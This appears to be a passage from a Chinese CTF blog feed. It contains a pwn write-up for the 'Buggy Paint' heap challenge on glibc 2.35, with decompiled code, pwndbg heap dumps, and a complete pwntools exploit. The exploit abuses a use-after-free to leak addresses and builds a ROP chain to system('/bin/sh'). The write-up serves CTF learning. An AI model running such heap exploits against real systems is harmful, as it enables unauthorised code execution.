class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Buggy-Paint"><a href="#Buggy-Paint" class="headerlink" title="Buggy Paint"></a>Buggy Paint</h2><p><code>glibc 2.35</code>的堆题，保护全开</p><p><code>add</code>中内容比较多， 需要注意的有两点，一个是<code>color</code>地址在<code>bss</code>段，和代码段存在固定偏移，一个是堆管理中存在堆地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        heap_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>heap <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        heap_ptr<span class="token operator">-></span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>        heap_ptr<span class="token operator">-></span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>        heap_ptr<span class="token operator">-></span>width <span class="token operator">=</span> width<span class="token punctuation">;</span>        heap_ptr<span class="token operator">-></span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> color <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>          color_code <span class="token operator">=</span> <span class="token string">"\x1B[31m"</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          color_code <span class="token operator">=</span> <span class="token string">"\x1B[32m"</span><span class="token punctuation">;</span>        heap_ptr<span class="token operator">-></span>color <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>color_code<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>heap_ptr<span class="token operator">-></span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>width <span class="token operator">*</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>heap_ptr<span class="token operator">-></span>ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> height <span class="token operator">*</span> width<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>heap_ptr<span class="token operator">-></span>ptr<span class="token punctuation">,</span> height <span class="token operator">*</span> width<span class="token punctuation">)</span><span class="token punctuation">;</span>        heap_manager<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> y<span class="token punctuation">]</span> <span class="token operator">=</span> heap_ptr<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞出现在<code>delete</code>中，存放堆内容的释放部分有<code>uaf</code>漏洞，指针未清零</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> heap_manager<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> y<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>heap_manager<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> y<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">40LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// uaf</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heap_manager<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      heap_manager<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个<code>selete</code>函数，将选中的堆地址放入<code>bss</code>段，<code>delete</code>和<code>edit</code>都是基于这个变量中的地址，但是堆删除之后也不影响对选中这个地址进行操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">selete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> x <span class="token operator">&lt;=</span> <span class="token number">0x1F</span> <span class="token operator">&amp;&amp;</span> y <span class="token operator">&lt;=</span> <span class="token number">0x1F</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> heap_manager<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> y<span class="token punctuation">]</span> <span class="token punctuation">)</span>      seleted_ptr <span class="token operator">=</span> heap_manager<span class="token punctuation">[</span><span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> y<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Empty cell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以本题的利用思路就是泄露堆基址、<code>libc</code>地址、程序基址、栈地址，最后将栈的返回地址劫持为<code>system(&#39;/bin/sh&#39;)</code></p><p>先创建堆看堆的内部结构</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x55fdf33982900x55fdf3398290: 0x0000000000000000      0x00000000000000410x55fdf33982a0: 0x0000000000000000      0x0000000000000000#x | y0x55fdf33982b0: 0x000055fdf2c1c07d      0x0000000000000008#color_addr in bss | width0x55fdf33982c0: 0x0000000000000002      0x000055fdf33982e0#height | heap_ptr0x55fdf33982d0: 0x0000000000000000      0x0000000000000021#size &#x3D; width * height0x55fdf33982e0: 0x0000000000000a61      0x0000000000000000#content 0x55fdf33982f0: 0x0000000000000000      0x0000000000020d11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>泄露堆基址：<code>tcache bin</code>中第一个被释放的堆<code>fd</code>就是堆基址，由于高版本存在<code>key</code>所以本题中<code>fd</code>是<code>key</code>，选中这个堆，删除再<code>show</code>即可得到<code>key</code>，再左移<code>12</code>位得到堆基址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">Free <span class="token function">chunk</span> <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSEAddr<span class="token operator">:</span> <span class="token number">0x5560820632d0</span>Size<span class="token operator">:</span> <span class="token number">0x20</span> <span class="token punctuation">(</span>with flag bits<span class="token operator">:</span> <span class="token number">0x21</span><span class="token punctuation">)</span>fd<span class="token operator">:</span> <span class="token number">0x556082063</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>泄露程序基址：堆管理中存在<code>color_addr</code>，就是程序中的一个地址，将<code>heap_ptr</code>改成堆中指向<code>color_addr</code>的地址，在输出<code>content</code>的时候就会输出该堆地址中的<code>color_addr</code>的地址，通过计算即可得到程序基址</p><p>创建两个堆，其中保存内容的堆大小要和堆管理的大小不同，选择第一个堆，将两个堆删除之后创建一个堆，坐标同第一个堆，大小（即<code>width*height</code>）同堆管理，这样就实现了伪造堆管理，创建的堆的堆管理落在第二个堆的堆管理上而存储内容的堆落在第一个堆的堆管理上。伪造<code>heap_ptr</code>为<code>color_addr</code>即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/20gx 0x5622d0d282900x5622d0d28290: 0x0000000000000000      0x0000000000000041<span class="token comment">#heap1</span>0x5622d0d282a0: 0x0000000000000000      0x00000000000000000x5622d0d282b0: 0x00005622d0d28000      0x00000000000000080x5622d0d282c0: 0x0000000000000001      0x00005622d0d28310<span class="token comment">#content_ptr</span>0x5622d0d282d0: 0x0000000000000000      0x00000000000000210x5622d0d282e0: 0x00000005622d0d28      0xa50b92a104492f290x5622d0d282f0: 0x0000000000000000      0x0000000000000041<span class="token comment">#heap2</span>0x5622d0d28300: 0x0000000000000000      0x00000000000000000x5622d0d28310: 0x00005622cff2d07d      0x0000000000000008<span class="token operator">&lt;</span>--target0x5622d0d28320: 0x0000000000000006      0x00005622d0d282a00x5622d0d28330: 0x0000000000000000      0x00000000000000210x5622d0d28340: 0x00005627b2ff8fc8      0xa50b92a104492f290x5622d0d28350: 0x0000000000000000      0x0000000000020cb1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时得到程序基址，即可计算出<code>got</code>地址，然后故技重施得到<code>libc</code>地址，再通过<code>environ</code>得到栈地址</p><p>最后劫持<code>main</code>函数的程序流为<code>system(&#39;/bin/sh&#39;)</code>,但直接改成<code>p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</code>会报错，所以要改成<code>p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rdi_ret + 1) + p64(system)</code>，<code>menu</code>中输入<code>1-5</code>以外的任何数触发<code>default</code>中的<code>return 0</code>即可运行到劫持部分</p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height<span class="token punctuation">,</span> color<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'x: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'y: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'width: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'height: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'color(1=red, 2=green): '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">select</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'x: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'y: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'New content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'x: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'y: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>select<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Box content:\n'</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base <span class="token operator">+</span> <span class="token number">0x310</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Box content:\n'</span><span class="token punctuation">)</span>elf_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x207d</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> elf_basedelete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>p1  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__environ'</span><span class="token punctuation">]</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x120</span>pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x2a3e5</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Protector"><a href="#Protector" class="headerlink" title="Protector"></a>Protector</h2>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 格式化字符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024春秋杯冬季赛—pwn部分wp</title>
      <link href="/2024/01/24/2024-chun-qiu-bei-dong-ji-sai-pwn-bu-fen-wp/2024-chun-qiu-bei-dong-ji-sai-pwn-bu-fen-writeup/"/>
      <url>/2024/01/24/2024-chun-qiu-bei-dong-ji-sai-pwn-bu-fen-wp/2024-chun-qiu-bei-dong-ji-sai-pwn-bu-fen-writeup/</url>
      
